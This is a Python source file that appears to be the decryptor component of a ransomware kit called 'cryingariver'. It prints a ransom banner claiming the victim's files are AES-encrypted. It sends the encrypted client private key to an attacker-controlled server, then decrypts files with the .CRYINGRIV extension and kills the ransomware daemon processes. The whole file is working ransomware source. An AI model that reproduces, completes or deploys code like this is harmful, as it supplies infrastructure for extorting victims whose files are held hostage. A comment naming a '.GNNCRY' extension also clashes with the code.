#!/usr/bin/env python
# _*_coding: UTF-8

from Crypto.Hash import SHA, MD5
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto import Random
from getters import Getters
from randomkey import generate_randomKey
from sym import AESHash
from paths_and_names import _name, _home, _home, _ransomware_path, _server_addr, _mac_id
import base64, subprocess, pickle, gc, random, time, os, sys, requests

class bcolors:
    BOLD = '\033[1m'
    GREEN = '\033[92m'
    RED = '\033[91m'
    END = '\033[0m'

logo = bcolors.GREEN + bcolors.BOLD + """
\t\t\t\t\t\t\t\t─▄▀▀▀▀▄─█──█────▄▀▀█─▄▀▀▀▀▄─█▀▀▄
\t\t\t\t\t\t\t\t─█────█─█──█────█────█────█─█──█
\t\t\t\t\t\t\t\t─█────█─█▀▀█────█─▄▄─█────█─█──█
\t\t\t\t\t\t\t\t─▀▄▄▄▄▀─█──█────▀▄▄█─▀▄▄▄▄▀─█▄▄▀
\t\t\t\t\t\t\t\t
\t\t\t\t\t\t\t\t─────────▄██████▀▀▀▀▀▀▄
\t\t\t\t\t\t\t\t─────▄█████████▄───────▀▀▄▄
\t\t\t\t\t\t\t\t──▄█████████████───────────▀▀▄
\t\t\t\t\t\t\t\t▄██████████████─▄▀───▀▄─▀▄▄▄──▀▄
\t\t\t\t\t\t\t\t███████████████──▄▀─▀▄▄▄▄▄▄────█
\t\t\t\t\t\t\t\t█████████████████▀█──▄█▄▄▄──────█
\t\t\t\t\t\t\t\t███████████──█▀█──▀▄─█─█─█───────█
\t\t\t\t\t\t\t\t████████████████───▀█─▀██▄▄──────█
\t\t\t\t\t\t\t\t█████████████████──▄─▀█▄─────▄───█
\t\t\t\t\t\t\t\t█████████████████▀███▀▀─▀▄────█──█
\t\t\t\t\t\t\t\t████████████████──────────█──▄▀──█
\t\t\t\t\t\t\t\t████████████████▄▀▀▀▀▀▀▄──█──────█
\t\t\t\t\t\t\t\t████████████████▀▀▀▀▀▀▀▄──█──────█
\t\t\t\t\t\t\t\t▀████████████████▀▀▀▀▀▀──────────█
\t\t\t\t\t\t\t\t──███████████████▀▀─────█──────▄▀
\t\t\t\t\t\t\t\t──▀█████████████────────█────▄▀
\t\t\t\t\t\t\t\t────▀████████████▄───▄▄█▀─▄█▀
\t\t\t\t\t\t\t\t──────▀████████████▀▀▀──▄███
\t\t\t\t\t\t\t\t──────████████████████████─█
\t\t\t\t\t\t\t\t─────████████████████████──█
\t\t\t\t\t\t\t\t────████████████████████───█
\t\t\t\t\t\t\t\t────██████████████████─────█
\t\t\t\t\t\t\t\t────██████████████████─────█
\t\t\t\t\t\t\t\t────██████████████████─────█
\t\t\t\t\t\t\t\t────██████████████████─────█
\t\t\t\t\t\t\t\t────██████████████████▄▄▄▄▄█
\t\t\t\t\t\t\t\t
\t\t\t\t\t\t\t\t─────────────█─────█─█──█─█───█
\t\t\t\t\t\t\t\t─────────────█─────█─█──█─▀█─█▀
\t\t\t\t\t\t\t\t─────────────█─▄█▄─█─█▀▀█──▀█▀
\t\t\t\t\t\t\t\t─────────────██▀─▀██─█──█───█



\t\t\t\t\t\t\tALL YOUR FILES ARE ENCRYPTED WITH AES-CBC-256\n
\t\t\t\t\tYOUR COMPUTER IS INFECTED WITH MALWARE THAT ENCRYPTED ALL YOUR IMPORTANT FILES\n
\t\t\t\t\t\t      THE ONLY WAY TO GET THEM BACK IS WITH THIS DECRYPTOR
""" + bcolors.END

BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

def kill_process():
	process = subprocess.Popen("pidof daemon", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	process2 = subprocess.Popen("pidof cryingariver", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	process3 = subprocess.Popen("pidof python main.py", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

	output = process.stdout.read() + process.stderr.read()
	pid_of_rans = process2.stdout.read() + process2.stderr.read()
	pid_of_rans2 = process3.stdout.read() + process3.stderr.read()
	try:
		pid_of_rans2 = pid_of_rans2.split(' ')[0]
	except:
		pass

	os.system('kill -9 {}'.format(pid_of_rans))
	os.system('kill -9 {}'.format(pid_of_rans2))
	os.system('kill -9 {}'.format(output))
	os.system("killall daemon")
	os.system('killall cryingariver')
	os.system('killall ./cryingariver')
	os.system('killall ./daemon')
	
def decrypt_aes_keys(enc, key):
	key_obj = RSA.importKey(key)
	hash_value = PKCS1_OAEP.new(key_obj)
	return hash_value.decrypt(enc)

def send_to_server_encrypted_private_key(id, private_encrypted_key):
	
	try:
		ret = requests.post(_server_addr, data=private_encrypted_key)
	except Exception as e:
		raise e

	print("key decrypted")

	private_key = ret.text
	return str(private_key)

def payment():
	pass

def menu():
	print("{}Importing the encrypted client private key".format(WHITE))
	try:
		with open(_ransomware_path + '/encrypted_client_private_key.key', 'rb') as f:
			encrypted_client_private_key = pickle.load(f)
	except IOError:
		print("encrypted client private key not found, I'm sorry. but all your files are lost!")
		sys.exit(-1)

	print("{}OK{}".format(GREEN, WHITE))

	key_to_be_sent = base64.b64encode(str(encrypted_client_private_key))

	# send to server to be decrypted
	while True:
		try:
			print("Requesting to server to decrypt the private key")
			client_private_key = send_to_server_encrypted_private_key(machine_id, key_to_be_sent)
			break
		except:
			print("{}No connection, sleeping for 2 minutes\nConnect to internet to get your files back!{}".format(RED, WHITE))
			time.sleep(120)

	# saving to disk the private key
	print("{}Client private key decrypted and stored to disk{}".format(GREEN, WHITE))
	with open(_ransomware_path + "/client_private_key.PEM", 'wb') as f:
		f.write(client_private_key)

	# GET THE AES KEYS and path
	try:
		with open(_ransomware_path + "/AES_encrypted_keys.txt") as f:
			content = f.read()
	except IOError:
		print("AES keys not found. Sorry but all your files are lost!")
		sys.exit(-1)

	# get the aes keys and IV's and paths back
	print('Decrypting the files ...')
	content = content.split('\n')
	content.remove('')
	aes_and_path = []
	for line in content:
		ret = line.split(' ') # enc(KEY) base64(PATH)
		encrypted_aes_key = base64.b64decode(ret[0])
		aes_key = decrypt_aes_keys(encrypted_aes_key, client_private_key)

		aes_and_path.append((aes_key, base64.b64decode(ret[1])))

	for a in aes_and_path:
		dec = AESHash(a[0])
		
		with open(a[1], 'rb') as f:
			encrypted_file_content = f.read()
		
		# decrypt content
		decrypted_file_content = dec.decrypt(encrypted_file_content)

		# save into new file without .GNNCRY extension
		old_file_name = a[1].replace(".CRYINGRIV", "")
		with open(old_file_name, 'w') as f:
			f.write(decrypted_file_content)
		
	# end of decryptor
	print("{}Decryption finished!{}".format(GREEN, WHITE))

	# kill deamon running on bg
	kill_process()

if __name__ == "__main__": 
    print(logo)
    menu()